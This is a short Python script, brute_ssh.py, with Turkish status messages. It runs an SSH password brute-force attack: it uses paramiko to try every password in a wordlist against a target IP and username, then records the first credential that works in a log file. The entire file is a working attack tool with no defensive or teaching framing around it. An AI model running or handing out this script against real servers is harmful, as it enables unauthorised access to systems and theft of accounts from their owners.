# brute_ssh.py
import paramiko
import time

def ssh_brute_force(target_ip, username, wordlist_file, port=22, delay=0.5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        try:
            client.connect(hostname=target_ip, port=port, username=username, password=password, timeout=5)
            print(f"[✓] Başarılı giriş: {username}:{password}")
            with open("success.log", "a") as log:
                log.write(f"{username}:{password} @ {target_ip}\n")
            break
        except paramiko.AuthenticationException:
            print(f"[-] Hatalı: {password}")
        except Exception as e:
            print(f"[!] Bağlantı hatası: {str(e)}")
        time.sleep(delay)
    client.close()
